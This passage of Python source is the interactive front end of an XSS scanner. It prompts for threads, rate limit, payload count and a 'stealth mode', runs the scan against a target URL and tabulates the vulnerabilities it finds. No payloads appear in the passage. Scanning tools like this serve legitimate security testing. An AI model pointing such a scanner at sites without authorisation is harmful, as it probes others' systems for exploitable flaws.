        "[bold yellow]Rate limit (requests per second)[/bold yellow]", 
        default=5,
        show_default=True
    )
    
    max_payloads = IntPrompt.ask(
        "[bold yellow]Max payloads per context[/bold yellow]", 
        default=15,
        show_default=True
    )
    
    batch_size = IntPrompt.ask(
        "[bold yellow]Batch size[/bold yellow]", 
        default=100,
        show_default=True
    )
    
    # Boolean options
    smart_mode = Confirm.ask(
        "[bold yellow]Enable smart mode[/bold yellow]", 
        default=False
    )
    
    stealth_mode = Confirm.ask(
        "[bold yellow]Enable stealth mode[/bold yellow]", 
        default=False
    )
    
    test_headers = Confirm.ask(
        "[bold yellow]Test headers[/bold yellow]", 
        default=False
    )
    
    verbose = Confirm.ask(
        "[bold yellow]Verbose output[/bold yellow]", 
        default=False
    )
    
    # Display configuration summary
    config_table = Table.grid(padding=(0, 2), expand=True)
    config_table.add_column(style="bold cyan", justify="right")
    config_table.add_column()
    
    config_table.add_row("Target URL:", url)
    config_table.add_row("Threads:", str(threads))
    config_table.add_row("Rate Limit:", f"{rate_limit} req/s")
    config_table.add_row("Max Payloads:", str(max_payloads))
    config_table.add_row("Batch Size:", str(batch_size))
    config_table.add_row("Smart Mode:", "✓ Enabled" if smart_mode else "✗ Disabled")
    config_table.add_row("Stealth Mode:", "✓ Enabled" if stealth_mode else "✗ Disabled")
    config_table.add_row("Test Headers:", "✓ Enabled" if test_headers else "✗ Disabled")
    config_table.add_row("Verbose:", "✓ Enabled" if verbose else "✗ Disabled")
    
    console.print("\n")
    console.print(Panel(
        config_table,
        title="[bold green]Scan Configuration Summary[/bold green]",
        border_style="blue"
    ))
    
    # Confirm before starting
    start_scan = Confirm.ask("\n[bold yellow]Start XSS scan with these settings?[/bold yellow]", default=True)
    
    if not start_scan:
        console.print("[yellow]Scan cancelled by user.[/yellow]")
        return
    
    # Run the scan
    config = {
        'threads': threads,
        'rate_limit': rate_limit,
        'max_payloads_per_context': max_payloads,
        'batch_size': batch_size,
        'smart_mode': smart_mode,
        'stealth_mode': stealth_mode,
        'test_headers': test_headers,
        'verbose': verbose
    }

    scanner = XSSScanner(url, config)

    try:
        vulnerabilities = await scanner.scan()

        if scanner.cancelled:
            console.print("\n[yellow]Scan cancelled by user. Displaying results found so far.[/yellow]")

        if vulnerabilities:
            console.print(f"\n[bold red]Found {len(vulnerabilities)} XSS vulnerabilities![/bold red]\n")

            table = Table(title="XSS Vulnerabilities Summary", show_header=True, header_style="bold magenta", expand=True)
            table.add_column("Parameter", style="cyan", max_width=20)
            table.add_column("Context", style="yellow")
            table.add_column("Severity", style="red")
            table.add_column("CVSS", style="green")
            table.add_column("Confidence", style="blue")
            table.add_column("URL", style="blue", overflow="fold")

            for vuln in sorted(vulnerabilities, key=lambda x: x.cvss_score, reverse=True)[:15]:
                severity_color = {
                    'critical': 'bold red', 'high': 'red', 'medium': 'yellow',
                    'low': 'blue', 'info': 'dim'
                }.get(vuln.severity.value[2], 'white')

                confidence = f"{(1.0 - vuln.false_positive_score) * 100:.0f}%"

                table.add_row(
                    vuln.parameter,
                    vuln.context.value,
                    f"[{severity_color}]{vuln.severity.value[2].upper()}[/{severity_color}]",
                    str(vuln.cvss_score),
                    confidence,
                    html.escape(vuln.url)
                )

            console.print(table)

            console.print("\n[bold cyan]Generating reports...[/bold cyan]")
            reporter = ReportGenerator()
            reporter.save_report(vulnerabilities, url, format='both')

        elif not scanner.cancelled:
            console.print("[bold green]No XSS vulnerabilities found![/bold green]")

    except (KeyboardInterrupt, asyncio.CancelledError):
        console.print("\n[yellow]Scan interrupted by user.[/yellow]")
    except Exception as e:
        console.print(f"\n[red]Unexpected error during scan: {e}[/red]")
        logger.exception("Scan failed with exception")

async def run_xss_scan(url=None, threads=20, rate_limit=5, max_payloads=15, 
                      batch_size=100, smart_mode=False, stealth_mode=False, 
                      test_headers=False, verbose=False):
    if url is None:
        return await run_xss_scan_interactive()
    
    clear_console()
    header_banner(tool_name="XSS Scanner")

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    config = {
        'threads': threads,
        'rate_limit': rate_limit,
        'max_payloads_per_context': max_payloads,
        'batch_size': batch_size,
        'smart_mode': smart_mode,
        'stealth_mode': stealth_mode,
        'test_headers': test_headers,
        'verbose': verbose
    }

    scanner = XSSScanner(url, config)

    try:
        vulnerabilities = await scanner.scan()

        if scanner.cancelled:
            console.print("\n[yellow]Scan cancelled by user. Displaying results found so far.[/yellow]")

        if vulnerabilities:
            console.print(f"\n[bold red]Found {len(vulnerabilities)} XSS vulnerabilities![/bold red]\n")

            table = Table(title="XSS Vulnerabilities Summary", show_header=True, header_style="bold magenta", expand=True)
            table.add_column("Parameter", style="cyan", max_width=20)
            table.add_column("Context", style="yellow")
            table.add_column("Severity", style="red")
            table.add_column("CVSS", style="green")
            table.add_column("Confidence", style="blue")
            table.add_column("URL", style="blue", overflow="fold")

            for vuln in sorted(vulnerabilities, key=lambda x: x.cvss_score, reverse=True)[:15]:
                severity_color = {
                    'critical': 'bold red', 'high': 'red', 'medium': 'yellow',
                    'low': 'blue', 'info': 'dim'
                }.get(vuln.severity.value[2], 'white')

                confidence = f"{(1.0 - vuln.false_positive_score) * 100:.0f}%"

                table.add_row(
                    vuln.parameter,
                    vuln.context.value,
                    f"[{severity_color}]{vuln.severity.value[2].upper()}[/{severity_color}]",
                    str(vuln.cvss_score),
                    confidence,
                    html.escape(vuln.url)
                )

            console.print(table)

            console.print("\n[bold cyan]Generating reports...[/bold cyan]")
            reporter = ReportGenerator()
            reporter.save_report(vulnerabilities, url, format='both')

        elif not scanner.cancelled:
            console.print("[bold green]No XSS vulnerabilities found![/bold green]")

    except (KeyboardInterrupt, asyncio.CancelledError):
        console.print("\n[yellow]Scan interrupted by user.[/yellow]")
    except Exception as e:
        console.print(f"\n[red]Unexpected error during scan: {e}[/red]")
        logger.exception("Scan failed with exception")


